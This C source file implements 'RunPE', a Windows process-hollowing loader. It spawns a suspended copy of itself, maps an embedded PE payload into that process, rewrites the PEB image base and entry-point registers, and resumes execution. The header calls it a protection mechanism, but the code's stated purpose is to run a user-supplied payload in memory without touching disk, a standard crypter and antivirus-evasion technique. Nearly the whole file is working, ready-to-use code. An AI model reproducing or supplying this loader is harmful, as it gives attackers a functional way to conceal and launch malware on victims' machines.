/**
 * RunPE - Portable Executable Loader
 *
 * Binary protection mechanism for running embedded PE images.
 * Supports both 32-bit and 64-bit Windows binaries.
 *
 * Compile as x86 for 32-bit payloads, x64 for 64-bit payloads.
 * Tested on Windows 10/11 with Visual Studio 2019+
 */

#include <stdio.h>
#include <Windows.h>

// Sample embedded PE data - replace with your own binary using bin_to_carray.py
// This is a placeholder; actual data should be generated from your target binary
unsigned char rawData[36864] = {
	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	// ... rest of your PE binary data
};

/**
 * Executes an embedded PE image in memory without writing to disk.
 * Creates a suspended process, maps the PE into its address space,
 * and resumes execution at the new entry point.
 *
 * @param Image - Pointer to the raw PE image data
 * @return 0 on success, non-zero error code on failure
 */
int RunPortableExecutable(void* Image) {
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_SECTION_HEADER* SectionHeader;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	CONTEXT* CTX;
	void* pImageBase;
	char CurrentFilePath[MAX_PATH];

	// Validate DOS header
	DOSHeader = (IMAGE_DOS_HEADER*)Image;
	if (DOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return 1; // Invalid DOS signature
	}

#ifdef _WIN64
	// 64-bit implementation
	IMAGE_NT_HEADERS64* NtHeader;
	NtHeader = (IMAGE_NT_HEADERS64*)((ULONG_PTR)Image + DOSHeader->e_lfanew);

	// Validate PE signature and architecture
	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		return 2; // Invalid PE signature
	}

	if (NtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
		return 3; // Architecture mismatch - expected x64
	}
#else
	// 32-bit implementation
	IMAGE_NT_HEADERS32* NtHeader;
	NtHeader = (IMAGE_NT_HEADERS32*)((ULONG_PTR)Image + DOSHeader->e_lfanew);

	// Validate PE signature and architecture
	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		return 2; // Invalid PE signature
	}

	if (NtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
		return 3; // Architecture mismatch - expected x86
	}
#endif

	// Get current executable path for process creation
	if (GetModuleFileNameA(NULL, CurrentFilePath, MAX_PATH) == 0) {
		return 4; // Failed to get module path
	}

	// Initialize process creation structures
	ZeroMemory(&PI, sizeof(PI));
	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);

	// Create suspended process (copy of self)
	if (!CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
		return 5; // Failed to create process
	}

	// Allocate memory for thread context
	CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (CTX == NULL) {
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 6; // Failed to allocate context memory
	}

	CTX->ContextFlags = CONTEXT_FULL;

	// Get thread context
	if (!GetThreadContext(PI.hThread, CTX)) {
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 7; // Failed to get thread context
	}

#ifdef _WIN64
	// 64-bit: RDX contains PEB address in initial thread context
	// PEB64->ImageBaseAddress is at offset 0x10
	ULONGLONG OriginalImageBase;
	if (!ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Rdx + 0x10),
		&OriginalImageBase, sizeof(OriginalImageBase), NULL)) {
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 8; // Failed to read original image base
	}

	// Allocate memory at preferred image base in target process
	pImageBase = VirtualAllocEx(PI.hProcess,
		(LPVOID)NtHeader->OptionalHeader.ImageBase,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	// If allocation at preferred base fails, try any available address
	if (pImageBase == NULL) {
		pImageBase = VirtualAllocEx(PI.hProcess,
			NULL,
			NtHeader->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);
	}
#else
	// 32-bit: EBX contains PEB address in initial thread context
	// PEB32->ImageBaseAddress is at offset 0x08
	DWORD OriginalImageBase;
	if (!ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + 0x08),
		&OriginalImageBase, sizeof(OriginalImageBase), NULL)) {
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 8; // Failed to read original image base
	}

	// Allocate memory at preferred image base in target process
	pImageBase = VirtualAllocEx(PI.hProcess,
		(LPVOID)NtHeader->OptionalHeader.ImageBase,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	// If allocation at preferred base fails, try any available address
	if (pImageBase == NULL) {
		pImageBase = VirtualAllocEx(PI.hProcess,
			NULL,
			NtHeader->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);
	}
#endif

	if (pImageBase == NULL) {
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 9; // Failed to allocate memory in target process
	}

	// Write PE headers to target process
	if (!WriteProcessMemory(PI.hProcess, pImageBase, Image,
		NtHeader->OptionalHeader.SizeOfHeaders, NULL)) {
		VirtualFreeEx(PI.hProcess, pImageBase, 0, MEM_RELEASE);
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 10; // Failed to write PE headers
	}

	// Write each section to target process
	// Use IMAGE_FIRST_SECTION macro for proper offset calculation
	SectionHeader = IMAGE_FIRST_SECTION((IMAGE_NT_HEADERS*)((ULONG_PTR)Image + DOSHeader->e_lfanew));

	for (WORD i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {
		if (SectionHeader[i].SizeOfRawData > 0) {
			if (!WriteProcessMemory(PI.hProcess,
				(LPVOID)((ULONG_PTR)pImageBase + SectionHeader[i].VirtualAddress),
				(LPVOID)((ULONG_PTR)Image + SectionHeader[i].PointerToRawData),
				SectionHeader[i].SizeOfRawData, NULL)) {
				// Continue on section write failure - some sections may be empty
			}
		}
	}

#ifdef _WIN64
	// Update ImageBase in PEB (64-bit)
	ULONGLONG NewImageBase = (ULONGLONG)pImageBase;
	if (!WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Rdx + 0x10),
		&NewImageBase, sizeof(NewImageBase), NULL)) {
		VirtualFreeEx(PI.hProcess, pImageBase, 0, MEM_RELEASE);
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 11; // Failed to update PEB ImageBase
	}

	// Set new entry point in thread context (64-bit uses RCX)
	CTX->Rcx = (ULONGLONG)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
#else
	// Update ImageBase in PEB (32-bit)
	DWORD NewImageBase = (DWORD)pImageBase;
	if (!WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + 0x08),
		&NewImageBase, sizeof(NewImageBase), NULL)) {
		VirtualFreeEx(PI.hProcess, pImageBase, 0, MEM_RELEASE);
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 11; // Failed to update PEB ImageBase
	}

	// Set new entry point in thread context (32-bit uses EAX)
	CTX->Eax = (DWORD)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
#endif

	// Apply modified context to thread
	if (!SetThreadContext(PI.hThread, CTX)) {
		VirtualFreeEx(PI.hProcess, pImageBase, 0, MEM_RELEASE);
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 12; // Failed to set thread context
	}

	// Resume thread execution
	if (ResumeThread(PI.hThread) == (DWORD)-1) {
		VirtualFreeEx(PI.hProcess, pImageBase, 0, MEM_RELEASE);
		VirtualFree(CTX, 0, MEM_RELEASE);
		TerminateProcess(PI.hProcess, 1);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 13; // Failed to resume thread
	}

	// Cleanup local resources
	VirtualFree(CTX, 0, MEM_RELEASE);
	CloseHandle(PI.hThread);
	CloseHandle(PI.hProcess);

	return 0; // Success
}

/**
 * Application entry point
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
	// Suppress unused parameter warnings
	(void)hInstance;
	(void)hPrevInstance;
	(void)lpCmdLine;
	(void)nCmdShow;

	int result = RunPortableExecutable(rawData);

	if (result != 0) {
		// Optional: Display error for debugging
		char errorMsg[64];
		wsprintfA(errorMsg, "RunPE failed with error code: %d", result);
		MessageBoxA(NULL, errorMsg, "Error", MB_OK | MB_ICONERROR);
	}

	return result;
}
